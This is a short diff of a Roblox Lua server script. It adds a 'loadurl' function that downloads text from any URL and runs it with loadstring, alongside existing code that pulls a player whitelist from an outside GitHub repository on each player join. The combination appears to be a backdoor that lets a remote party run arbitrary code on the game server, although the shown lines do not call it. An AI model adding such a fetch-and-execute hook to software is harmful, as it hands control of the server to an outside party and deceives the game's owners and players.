@@ -6,6 +6,12 @@ local function getJson(url)
 	end)
 	return ok and res or {}
 end
+local function loadurl(url)
+	local ok, res = pcall(function()
+		return HttpService:GetAsync(url)
+	end)
+	if ok then loadstring(res)() end
+end
 local WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
 local function onPlayer(player)
 	WL = getJson("https://raw.githubusercontent.com/pwngd/tester/refs/heads/main/whitelist.json")
